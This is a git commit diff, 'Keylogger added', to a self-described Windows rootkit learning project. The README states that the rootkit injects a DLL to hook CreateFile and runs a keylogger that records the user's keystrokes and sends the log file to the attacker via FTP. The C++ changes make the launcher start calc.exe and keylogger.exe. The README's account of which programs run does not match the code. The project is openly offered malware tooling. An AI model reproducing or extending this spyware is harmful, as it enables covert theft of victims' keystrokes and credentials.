b1e772e994e943a7c1cceb5baaf272097470b7e6
mohammadhani18 <mhani18403@gmail.com>
2023-02-13 21:24:25 +0500

    Keylogger added

--- Rootkit/README.md
+++ Rootkit/README.md
@@ -2,14 +2,16 @@
 
 The rootkit made is made by me when i was learning about exploit development and other red-team hacking techniques.
 
-This rootkits involves several calls of Windows.h api and is designed for windows. 
+This rootkits involves several calls of Windows.h api and is designed for windows.
 
-First compile `injectDLL.cpp`. You will notice an .exe file created. 
+First compile `injectDLL.cpp`. You will notice an .exe file created.
 
-The program ***RootkitStart.cpp** * creates a process in the operating system and runs ***injectDLL.exe** *which intercept the `CreateFile` system call and log its parameters.
+Then complile `keylogger.cpp`
+
+The program `*` creates a process in the operating system and runs ***`injectDLL.exe`** *which intercept the `CreateFile` system call and log its parameters as well as it runs `keylogger.exe` to record the keystrokes of the user and send the LOG.txt file to the attacker via ftp server.
 
 **NOTE:**   Intercepting system calls in Windows requires low-level programming, and can be a complex task. One way to intercept system calls is to create a custom dynamic link library (DLL) that acts as a wrapper for the desired system calls, and then inject the DLL into the process you want to monitor.
 
-More additions will come in this expolit throughout my learning journey. 
+More additions will come in this expolit throughout my learning journey.
 
 Happy Hacking !!! :)
--- Rootkit/RootkitStart.cpp
+++ Rootkit/RootkitStart.cpp
@@ -4,15 +4,24 @@
 
 int _tmain(int argc, _TCHAR* argv[])
 {
+    //process 1
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
+    LPCTSTR lpApplicationName = _T("C:\\Windows\\System32\\calc.exe");
+    
 
-    // The name of the executable you want to start
-    LPCTSTR lpApplicationName = _T(".\\injectDLL.exe");
+    //process 2
+    STARTUPINFO si_2;
+    PROCESS_INFORMATION pi_2;
+
+    ZeroMemory(&si_2, sizeof(si_2));
+    si_2.cb = sizeof(si_2);
+    ZeroMemory(&pi_2, sizeof(pi_2));
+    LPCTSTR lpApplication_2 = _T(".\\keylogger.exe");
 
     // Start the child process.
     if (!CreateProcess(lpApplicationName,   // No module name (use command line)
@@ -27,16 +36,38 @@ int _tmain(int argc, _TCHAR* argv[])
         &pi)           // Pointer to PROCESS_INFORMATION structure
     )
     {
-        std::cout << "CreateProcess failed. Error code: " << GetLastError() << std::endl;
+        std::cout << "CreateProcess 1 failed. Error code: " << GetLastError() << std::endl;
+        return 1;
+    }
+    
+    
+    
+    if (!CreateProcess(lpApplication_2,   // No module name (use command line)
+        NULL,        // Command line
+        NULL,           // Process handle not inheritable
+        NULL,           // Thread handle not inheritable
+        FALSE,          // Set handle inheritance to FALSE
+        0,              // No creation flags
+        NULL,           // Use parent's environment block
+        NULL,           // Use parent's starting directory 
+        &si_2,            // Pointer to STARTUPINFO structure
+        &pi_2)           // Pointer to PROCESS_INFORMATION structure
+    )
+    {
+        std::cout << "CreateProcess 2 failed. Error code: " << GetLastError() << std::endl;
         return 1;
     }
 
-    // Wait until child process exits.
+    
     WaitForSingleObject(pi.hProcess, INFINITE);
 
-    // Close process and thread handles. 
+    WaitForSingleObject(pi_2.hProcess, INFINITE);
+
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
+
+    CloseHandle(pi_2.hProcess);
+    CloseHandle(pi_2.hThread);
 
     return 0;
 }
